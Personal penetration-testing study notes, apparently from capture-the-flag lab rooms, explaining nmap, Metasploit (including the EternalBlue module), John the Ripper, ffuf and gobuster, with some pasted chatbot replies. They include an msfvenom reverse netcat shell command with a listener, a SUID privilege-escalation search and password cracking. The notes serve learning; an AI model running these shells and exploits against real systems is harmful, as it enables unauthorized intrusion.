`find / -perm -4000 -type f 2>/dev/null`: To locate files with SUID permissions, which may allow privilege escalation.

## General Tools

- **Nmap**:
    - Scans the target to determine:
        - Open ports.
        - Operating system and its version.
        - Running services and their versions.
- **dirb/dirbuster**:
    - Enumerate commonly-named directories on a website.
- **enum4linux**:
    - Focuses on vulnerabilities specific to Linux systems.
- **metasploit**:
    - Primarily for exploitation but includes enumeration capabilities.
- **Burp Suite**:
    - Scans websites for subdirectories and intercepts network traffic.


### Common Exploitation Tools

- **Metasploit**: A versatile exploitation framework with built-in scripts for a variety of vulnerabilities.
- **Burp Suite**: Can exploit web application vulnerabilities like SQL Injection and Cross-Site Scripting.
- **SQLMap**: Automates SQL Injection attacks.
- **msfvenom**: Used to create custom payloads.
- **BeEF**: Specialized in browser-based exploitation.

## using msfvenom 

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:  

**"msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R"**

-p = payload

lhost = our local host IP address (this is **your** machine's IP address)

lport = the port to listen on (this is the port on **your** machine)

R = export the payload in raw format


this did not work , how i fixed it :

ip a 

gets the ip the put it directly in lhost

└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.21.117.138 lport=4444 R

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

**"nc -lvnp [listening port]"**


Great! Now that's running, we need to copy and paste our msfvenom payload into the telnet session and run it as a command. Hopefully- this will give us a shell on the target machine!

![[Pasted image 20250107223617.png]]


![[Pasted image 20250107223636.png]]



## MetaSploit EXPLANATION

Metasploit tip: View missing module options with show missing




### Metasploit Framework Intro

**Metasploit** is a widely used exploitation framework that plays a key role in penetration testing, supporting all phases of an engagement:

- **Information Gathering**
- **Scanning**
- **Exploitation**
- **Exploit Development**
- **Post-Exploitation**

It has two main versions:

- **Metasploit Pro**: Commercial version with a GUI, designed for automation and management of tasks.
- **Metasploit Framework**: Open-source, command-line version commonly used for penetration testing.

##### Key Components of Metasploit Framework

1. **msfconsole**: The main command-line interface for interacting with Metasploit.
2. **Modules**: Includes various types like exploits, scanners, payloads, etc.
3. **Tools**: Stand-alone tools for vulnerability research and penetration testing, such as **msfvenom**, **pattern_create**, and **pattern_offset**. These tools are useful for exploit development (beyond the scope here).

This room will help you master the **Metasploit Framework**, enabling you to efficiently find exploits, set parameters, and exploit vulnerable services on a target system. By the end of the module, you'll be comfortable navigating Metasploit's command-line interface.


#### Main Components of Metasploit

##### Metasploit Console

The **Metasploit console** is the primary interface to interact with various modules in the Metasploit Framework. You launch it using the command `msfconsole` from the terminal. This console allows you to use different modules to perform tasks like exploiting vulnerabilities, scanning targets, or executing brute-force attacks.

##### Key Concepts

1. **Exploit**: A piece of code designed to take advantage of a vulnerability in the target system.
2. **Vulnerability**: A flaw or weakness in the target system that can be exploited to gain unauthorized access or execute malicious actions.
3. **Payload**: The code that runs on the target system after the exploit is successful. It is designed to achieve the attacker's goal, such as gaining access to the system or extracting data.

##### Metasploit Modules

Metasploit modules are small, specialized components that perform specific tasks. They are categorized into different types based on their function:

- **Exploits**: Modules designed to exploit vulnerabilities in the target system.
- **Scanners**: Used to identify vulnerabilities or services on a target system.
- **Payloads**: Code that is executed on the target system after a successful exploit.
- **Auxiliary**: Used for tasks such as denial of service, fuzzing, and information gathering.
- **Post-exploitation**: Modules for tasks after successful exploitation, such as privilege escalation and data collection.

You will interact with these modules primarily through the **msfconsole** to conduct penetration testing tasks.


##### Finding modules

###### Auxiliary

Auxiliary modules in Metasploit are supporting components used for a variety of tasks such as scanning, crawling, and fuzzing. These modules assist in different phases of penetration testing but do not directly exploit vulnerabilities. You can find these modules in the **auxiliary** directory.

```
msfconsole > search auxiliary
```

###### Encoders

Encoders in Metasploit are used to encode the exploit and payload in a way that makes it less detectable by signature-based antivirus solutions. However, their success is limited as antivirus software may use additional checks to detect threats.

```
msfconsole > search encoder
```

###### Evasion

Evasion modules are designed to help evade detection by antivirus software and intrusion detection systems (IDS). Unlike encoders, these modules specifically focus on bypassing security systems that might block payloads.

```
msfconsole > search evasion
```

###### Exploits

Exploits are organized based on the target system. They are used to take advantage of vulnerabilities in the target to gain unauthorized access or control.

```
msfconsole > search exploit
```

###### NOPs

NOP (No Operation) modules are often used to pad payloads and create buffer sizes for exploits. These are represented in the Intel x86 CPU architecture as `0x90`.

```
msfconsole > search nop
```

###### Payloads

Payloads are the actual code executed on the target system after a successful exploit. They perform tasks such as opening a shell, running commands, or installing malware. Metasploit offers four categories of payloads:

- **Adapters**: Wrappers for other payloads, converting them into different formats (e.g., Powershell adapter).
- **Singles**: Self-contained payloads that don't require additional components.
- **Stagers**: Set up a communication channel with the target and help download the full payload.
- **Stages**: The second part of a staged payload, downloaded after the stager is executed.

```
msfconsole > search payload

```
###### Post

Post-exploitation modules are used after gaining access to a system. They help maintain access, gather further information, or escalate privileges.

```
msfconsole > search post

```
###### Finding Modules

You can explore the available modules in Metasploit under the **/opt/metasploit-framework/embedded/framework/modules** directory on your system.


Got it! Here’s the updated summary with the correct heading format:

#### **msfconsole Summary**

Metasploit Framework is a powerful penetration testing tool used to exploit vulnerabilities in systems. It allows users to interact with various modules such as exploits, payloads, and auxiliary modules, and provides an interactive environment for attackers to run tests and actions.

##### **Basic Commands**

1. **use**: This command loads a specific module (e.g., exploit, payload, auxiliary).
    
    - Example: `use exploit/windows/smb/ms17_010_eternalblue`
2. **show options**: Displays configuration options for the loaded module. This is crucial for setting up required parameters.
    
    - Example: Required options may include `RHOSTS`, `RPORT`, etc.
3. **show payloads**: Lists the available payloads compatible with the current exploit. Payloads define what happens once the exploit succeeds (e.g., reverse shell, Meterpreter).
    
4. **info**: Displays detailed information about the current module, including its description, vulnerabilities it targets, and references.
    
5. **search**: This command allows you to search for specific modules within the Metasploit database using keywords, CVE IDs, or module names.
    
    - Example: `search ms17-010` to find modules related to the MS17-010 vulnerability.
6. **ls**: Lists files and directories in the current context.
    
7. **back**: Exits the current module and returns to the main `msfconsole` prompt.
    

##### **Working with Modules**

- **Modules**: Metasploit is modular, meaning you can load different types of modules based on the task (e.g., exploits, scanners, payloads).
    
    - **Exploits**: Used to target vulnerabilities.
    - **Auxiliary**: Can perform tasks like scanning or fuzzing.
    - **Payloads**: Specify what happens after a successful exploit (e.g., shell, Meterpreter).
- **Setting Options**: Each module has specific settings (e.g., IP address, port). Use the `show options` command to see what needs to be configured.
    
- **Running the Exploit**: Once options are set, you can run the exploit using the `run` command, which attempts to exploit the target system.
    

##### **Search and Discovery**

- You can search for modules based on different criteria like type (`search type:auxiliary`) or keyword (e.g., CVE).

##### **Exploit Rank and Reliability**

- Modules are ranked based on reliability (e.g., Average, Great, Normal), which reflects their chances of success in real-world attacks.

Metasploit also provides extensive documentation and references for each module, including links to the original vulnerability details or related advisories.

Apologies for missing some parts in the previous response. Let me provide a more detailed overview based on the information provided, ensuring all essential elements are covered.

---

#### **Metasploit Workflow Overview**

##### **Module Context and Parameter Settings**

1. **Entering Metasploit Prompt:**
    
    - When you enter the Metasploit context, you will see different prompts based on your location within the system:
        - **Regular command prompt:** Cannot run Metasploit commands.
        - **Metasploit command prompt (`msf6 >`):** General prompt without a specific module selected.
        - **Module context prompt:** Once you select a module, you can use context-specific commands like `set`, `show options`, etc.
        - **Meterpreter prompt:** If a payload is successfully executed, this allows you to interact with the target system.
        - **Shell on target system:** If you get a direct shell, you interact with the target system using a regular command prompt.
2. **Setting Parameters:**
    
    - Use the `set PARAMETER_NAME VALUE` syntax to configure specific parameters for the module:
        - **RHOSTS**: IP address or range of the target machine.
        - **RPORT**: The port on the target machine that is vulnerable.
        - **LHOST** and **LPORT**: Your attacker's machine IP and port to receive connections.
        - **PAYLOAD**: The payload that you want to deploy on the target.
        - **SESSION**: Identifies sessions when multiple are created.
    - Use `show options` to verify if parameters are set correctly.

##### **Setting Global and Module-Specific Parameters**

- **Setg Command:**
    - Use `setg` to set parameters globally across all modules, e.g., `setg rhosts 10.10.165.39`. This prevents you from needing to repeatedly set parameters for each new module.
- **Unset Command:**
    - Use `unset PARAMETER_NAME` to clear individual parameters or `unset all` to clear all parameters.

##### **Exploit Execution and Interaction**

1. **Running an Exploit:**
    
    - Once the parameters are configured, use `exploit` to run the module.
    - The `exploit -z` flag can be used to run the exploit and send the session to the background once it opens.
2. **Using the `back` Command:**
    
    - The `back` command is used to exit the current module context and return to the Metasploit prompt.
3. **Launching a Vulnerability Scan (Auxiliary Modules):**
    
    - The `auxiliary/scanner/smb/smb_ms17_010` module is an example of a scanner used to check for MS17-010 vulnerabilities before running the exploit.

##### **Session Management**

1. **Session Creation:**
    
    - After a successful exploit, a **session** is created. It represents the communication between the target system and Metasploit. You can view all active sessions with `sessions`.
2. **Interacting with Sessions:**
    
    - To interact with a session, use the command `sessions -i <session_id>`. This allows you to interact with the compromised system (e.g., Meterpreter shell, command shell).
3. **Backgrounding Sessions:**
    
    - Use the `background` command to return to the Metasploit prompt while keeping the session active in the background.
4. **Session Listing:**
    
    - Use `sessions` to view active sessions.
5. **Session ID:**
    
    - Each session gets an ID number, which you can use to manage specific sessions. You can interact with, background, or even kill sessions based on their ID.

##### **Example Workflow:**

1. **Set Up and Launch Exploit:**
    
    - Use `use exploit/windows/smb/ms17_010_eternalblue`.
    - Set `rhosts` to the target's IP (e.g., `set rhosts 10.10.165.39`).
    - Run the exploit with `exploit`.
2. **Switch to a Scanning Module:**
    
    - After setting global parameters using `setg`, switch to a scanner module:
        - `use auxiliary/scanner/smb/smb_ms17_010`.
    - The parameters (like `rhosts`) will remain set.
3. **Background Session and Interact with It:**
    
    - Once the exploit creates a session, use `background` to return to the main prompt.
    - Use `sessions` to see active sessions and `sessions -i <id>` to interact with a specific session.

---

#### **Key Commands Recap**

- **Module Selection:**
    
    - `use <module_name>`: Select the module you want to use.
- **Set Parameters:**
    
    - `set PARAMETER_NAME VALUE`: Set a specific parameter for a module.
    - `setg PARAMETER_NAME VALUE`: Set a global parameter for all modules.
- **View Options:**
    
    - `show options`: Display available parameters for the selected module.
- **Execute Exploit:**
    
    - `exploit`: Run the exploit against the target.
    - `exploit -z`: Run the exploit and background the session.
- **Session Management:**
    
    - `sessions`: List all active sessions.
    - `sessions -i <id>`: Interact with a specific session.
    - `background`: Send the current session to the background.
    - `back`: Exit the module and return to the Metasploit prompt.
- **Unset Parameters:**
    
    - `unset PARAMETER_NAME`: Clear a specific parameter.
    - `unset all`: Clear all set parameters.

---




## John the ripper EXPLANATION
 

### 1. Installation
First, you need to install John the Ripper. The installation process depends on your operating system.

#### On Linux:
You can install John the Ripper using the package manager. For example, on Debian-based systems like Ubuntu, you can use:
```sh
sudo apt-get update
sudo apt-get install john
```

### 2. Basic Usage
Once installed, you can use John the Ripper to crack passwords. Here are some basic commands:

#### Cracking a Single Hash:
To crack a single hash, you can use the following command:
```sh
john --format=<hash_type> <hash_file>
```
Replace `<hash_type>` with the type of hash you're dealing with (e.g., `raw-md5`, `sha256crypt`, etc.) and `<hash_file>` with the file containing the hash.

#### Example:
```sh
john --format=raw-md5 hash.txt
```

#### Cracking Multiple Hashes:
If you have multiple hashes in a file, you can use:
```sh
john --format=<hash_type> <hash_file>
```

#### Example:
```sh
john --format=raw-md5 hashes.txt
```

### 3. Using Wordlists
John the Ripper can use wordlists to attempt common passwords. You can specify a wordlist with the `--wordlist` option:
```sh
john --wordlist=<wordlist_file> <hash_file>
```

#### Example:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### 4. Running John the Ripper in the Background
If you want to run John the Ripper in the background and check the progress later, you can use:
```sh
john --background <hash_file>
```

To check the status later, use:
```sh
john --status
```

### 5. Saving and Loading Sessions
You can save the current session and load it later:
```sh
john --save
john --load
```

### 6. Custom Rules
John the Ripper supports custom rules for password cracking. You can create your own rule set and apply it using the `--rules` option:
```sh
john --rules --format=<hash_type> <hash_file>
```

### 7. Stopping John the Ripper
To stop John the Ripper, you can use:
```sh
john --stop
```

### 8. Viewing Cracked Passwords
After running John the Ripper, you can view the cracked passwords using:
```sh
john --show <hash_file>
```

#### Example:
```sh
john --show hashes.txt
```

### Example Scenario
Let's say you have a file `hashes.txt` containing the following MD5 hashes:
```
5f4dcc3b5aa765d61d8327deb882cf99
e38ad214943daad1d64c102faec29de4
```

You can run John the Ripper to crack these hashes using a wordlist:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

After running, you can check the status and view the cracked passwords:
```sh
john --status
john --show hashes.txt
```

That's a basic overview of how to use John the Ripper. If you have any specific questions or need more advanced usage examples, feel free to ask!


## ffuf EXPLANATION

Sure! Let's summarize the basics of using `ffuf` (Fuzz Faster U Fool), a popular web fuzzing tool, and provide some examples to help you get started.

### Summary of Key Options

1. **HTTP Options**:
   - `-H`: Add custom headers.
   - `-X`: Specify HTTP method (e.g., GET, POST).
   - `-u`: Target URL.
   - `-b`: Add cookies.
   - `-d`: Specify POST data.
   - `-r`: Follow redirects.
   - `-recursion`: Enable recursive fuzzing.

2. **General Options**:
   - `-t`: Number of concurrent threads.
   - `-p`: Delay between requests.
   - `-s`: Silent mode (no additional info).
   - `-v`: Verbose output.

3. **Matcher Options**:
   - `-mc`: Match specific HTTP status codes.
   - `-mr`: Match regex in response.
   - `-ms`: Match response size.

4. **Filter Options**:
   - `-fc`: Filter specific HTTP status codes.
   - `-fr`: Filter regex in response.
   - `-fs`: Filter response size.

5. **Input Options**:
   - `-w`: Specify wordlist and keyword (default is `FUZZ`).
   - `-e`: Add file extensions to fuzz.
   - `-mode`: Multi-wordlist modes (`clusterbomb`, `pitchfork`).

6. **Output Options**:
   - `-o`: Save output to a file.
   - `-of`: Output format (e.g., json, csv).

### Basic Usage

To use `ffuf`, you typically need to specify a target URL (`-u`) and a wordlist (`-w`). The `FUZZ` keyword is used to indicate where the wordlist entries will be injected.

### Examples

1. **Basic Directory Fuzzing**:
   ```bash
   ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
   ```
   This command fuzzes directories on `http://MACHINE_IP` using the `big.txt` wordlist.

2. **Custom Keyword**:
   ```bash
   ffuf -u http://MACHINE_IP/NORAJ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt:NORAJ
   ```
   Here, `NORAJ` is used as the keyword instead of `FUZZ`.

3. **Fuzzing with Extensions**:
   ```bash
   ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -e .php,.html
   ```
   This command fuzzes for files with `.php` and `.html` extensions.

4. **Matching Specific Status Codes**:
   ```bash
   ffuf -u http://MACHINE_IP/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -mc 200,301,302
   ```
   This command only matches responses with status codes 200, 301, or 302.

5. **Using Multiple Wordlists**:
   ```bash
   ffuf -u http://MACHINE_IP/FUZZ1/FUZZ2 -w /path/to/wordlist1.txt:FUZZ1 -w /path/to/wordlist2.txt:FUZZ2 -mode clusterbomb
   ```
   This command uses two wordlists with the `clusterbomb` mode to fuzz multiple positions.

These examples should help you get started with `ffuf`. Remember to adjust paths and options based on your specific needs and environment. Happy fuzzing!


## **Gobuster EXPLANATION**

Gobuster is a powerful tool for brute-forcing directories, subdomains, and virtual hosts. It offers various modes to suit different enumeration needs. Below is a concise summary of its key features, flags, and usage examples.

### 1. Introduction to Gobuster

Gobuster is used for discovering hidden resources on web servers by brute-forcing directories, subdomains, and virtual hosts. It supports multiple modes, each tailored for specific tasks.

### 2. Dir Mode Summary (Directory Enumeration)

**Essential Flags:**
- `-u` or `--url`: Specifies the target URL.
- `-w` or `--wordlist`: Specifies the wordlist to use.
- `-x` or `--extensions`: Specifies file extensions to try.
- `-t` or `--threads`: Sets the number of concurrent threads.
- `--delay`: Sets the delay between requests.
- `-o` or `--output`: Specifies the output file.
- `-q` or `--quiet`: Runs in quiet mode, showing only results.
- `-n` or `--no-status`: Hides status codes in the output.
- `-s` or `--status-codes`: Specifies positive HTTP status codes to consider.
- `-b` or `--status-codes-blacklist`: Specifies status codes to ignore.

**Example Commands:**
- Basic directory enumeration:
  ```bash
  gobuster dir -u http://example.com -w wordlist.txt -x php,html -t 10 -o results.txt
  ```
- Quiet mode with specific status codes:
  ```bash
  gobuster dir -u http://example.com -w wordlist.txt -s 200,301 -q
  ```

### 3. DNS Mode Summary (Subdomain Enumeration)

**Essential Flags:**
- `-d` or `--domain`: Specifies the target domain.
- `-w` or `--wordlist`: Specifies the wordlist for subdomains.
- `-r` or `--resolver`: Specifies the DNS resolver server.
- `-o` or `--output`: Specifies the output file.
- `-q` or `--quiet`: Runs in quiet mode.
- `--show-cname`: Shows CNAME records.
- `--show-ips`: Shows IP addresses associated with subdomains.

**Example Commands:**
- Basic subdomain enumeration:
  ```bash
  gobuster dns -d example.com -w subdomains.txt -r 8.8.8.8 -o dns_results.txt
  ```
- Show CNAME records:
  ```bash
  gobuster dns -d example.com -w subdomains.txt --show-cname
  ```

### 4. VHost Mode Summary (Virtual Host Enumeration)

**Essential Flags:**
- `-u` or `--url`: Specifies the target URL.
- `-w` or `--wordlist`: Specifies the wordlist for virtual hosts.
- `-t` or `--threads`: Sets the number of concurrent threads.
- `-o` or `--output`: Specifies the output file.
- `-q` or `--quiet`: Runs in quiet mode.
- `-U` or `--username` and `-P` or `--password`: For HTTP authentication.
- `-H` or `--headers`: Adds custom HTTP headers.

**Example Commands:**
- Basic virtual host enumeration:
  ```bash
  gobuster vhost -u http://example.com -w vhosts.txt -t 5 -o vhost_results.txt
  ```
- With custom headers:
  ```bash
  gobuster vhost -u http://example.com -w vhosts.txt -H "User-Agent: CustomAgent"
  ```

### 5. Global Flags

- `--delay`: Delay between requests.
- `--no-progress`: Disables progress bars.
- `-v` or `--verbose`: Enables verbose output.
- `-k` or `--no-tls-validation`: Disables TLS certificate validation.

### 6. Best Practices and Ethical Considerations

- Always obtain permission before scanning any target.
- Be mindful of rate limits and server load.
- Use wordlists appropriately and responsibly.

This summary provides a comprehensive overview of Gobuster's capabilities and flags, ensuring effective and ethical usage in web enumeration tasks.